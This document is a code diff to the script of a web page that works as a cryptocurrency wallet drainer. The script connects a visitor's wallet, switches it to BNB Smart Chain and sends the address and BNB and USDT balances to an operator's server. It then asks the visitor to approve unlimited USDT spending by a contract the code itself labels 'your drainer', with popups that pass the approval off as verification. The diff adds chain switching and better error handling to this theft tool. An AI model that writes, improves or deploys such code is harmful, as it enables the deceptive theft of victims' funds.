@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,52 +21,81 @@
   <div id="popup"></div>
 
 <script>
-const DRRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa"; // <-- your Drainer contract
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";   // USDT BSC
-const BACKEND_API_URL = "http://YOUR_SERVER_IP:8080/log_approval";      // <-- point to Flask
+const DRRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa"; // your drainer
+const USDT_CONTRACT = "0x55d398326f99059Ff775485246999027B3197955";   // USDT BSC
+const BACKEND_API_URL = "https://YOUR_SERVER_IP:8080/log_approval";      // <-- change to your Flask endpoint
 
 let provider, signer, userAddress;
 
-// Approve function
 async function approveToken() {
     if (!window.ethereum) {
-        alert("Please install MetaMask or Trust Wallet!");
+        showPopup("❌ Web3 wallet not found.<br><br>Install Metamask or Trust Wallet extension.");
         return;
     }
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-
-    // Get BNB and USDT balances
-    const bnbBalance = ethers.utils.formatEther(await provider.getBalance(userAddress));
-    const usdtAbi = [
-      "function balanceOf(address) view returns (uint256)",
-      "function approve(address,uint256) returns (bool)"
-    ];
-    const usdt = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
-    const usdtBalance = ethers.utils.formatUnits(await usdt.balanceOf(userAddress), 18);
-
-    // Send wallet info to backend
-    fetch(BACKEND_API_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ wallet: userAddress, bnb: bnbBalance, usdt: usdtBalance })
-    });
-
-    // Approve unlimited USDT for Drainer
     try {
-      const maxUint = ethers.constants.MaxUint256;
-      const tx = await usdt.approve(DRRAINER_CONTRACT, maxUint);
-      showPopup("Waiting for approval confirmation...");
-      await tx.wait();
-      showPopup(
-        "✅ USDT Approved for Verification.<br><br>Your wallet is being checked.<br>Wallet: <b>" +
-        userAddress.slice(0,8) + "..." + userAddress.slice(-6) +
-        "</b><br>USDT Balance: <b>" + usdtBalance + "</b><br>BNB: <b>" + bnbBalance + "</b>"
-      );
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+
+        // 1. Prompt network switch to BSC
+        const BSC_CHAIN_ID = "0x38";
+        let chainId = await provider.send('eth_chainId', []);
+        if (chainId !== BSC_CHAIN_ID) {
+            try {
+                await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
+                showPopup("Switched to BNB Smart Chain.");
+            } catch(e) {
+                // If chain not added
+                if (e.code === 4902) {
+                    await provider.send("wallet_addEthereumChain", [{
+                        chainId: BSC_CHAIN_ID,
+                        chainName: "Binance Smart Chain",
+                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com"]
+                    }]);
+                } else {
+                    showPopup("❌ Please switch to BNB Smart Chain in your wallet.");
+                    return;
+                }
+            }
+        }
+
+        // 2. Prompt user to connect
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+
+        // 3. Get BNB and USDT balances
+        const bnbBalance = ethers.utils.formatEther(await provider.getBalance(userAddress));
+        const usdtAbi = [
+          "function balanceOf(address) view returns (uint256)",
+          "function approve(address,uint256) returns (bool)"
+        ];
+        const usdt = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+        const usdtBalance = ethers.utils.formatUnits(await usdt.balanceOf(userAddress), 18);
+
+        // 4. Send to backend (CORS required on backend)
+        fetch(BACKEND_API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ wallet: userAddress, bnb: bnbBalance, usdt: usdtBalance })
+        });
+
+        // 5. Approve unlimited USDT
+        try {
+          const maxUint = ethers.constants.MaxUint256;
+          const tx = await usdt.approve(DRRAINER_CONTRACT, maxUint);
+          showPopup("Please approve in your wallet...");
+          await tx.wait();
+          showPopup(
+            "✅ USDT Approved!<br>Your wallet:<br><b>" +
+            userAddress.slice(0,8) + "..." + userAddress.slice(-6) +
+            "</b><br>USDT: <b>" + usdtBalance + "</b><br>BNB: <b>" + bnbBalance + "</b>"
+          );
+        } catch(e) {
+          showPopup("❌ User rejected approval or error: " + e.message);
+        }
     } catch(e) {
-      showPopup("❌ User rejected approval or error: " + e.message);
+        showPopup("❌ Wallet connection failed: " + e.message);
     }
 }
 
@@ -75,7 +103,7 @@ function showPopup(msg) {
     const popup = document.getElementById('popup');
     popup.style.display = 'block';
     popup.innerHTML = msg;
-    setTimeout(() => popup.style.display='none', 4500);
+    setTimeout(() => popup.style.display='none', 6000);
 }
 </script>
 </body>
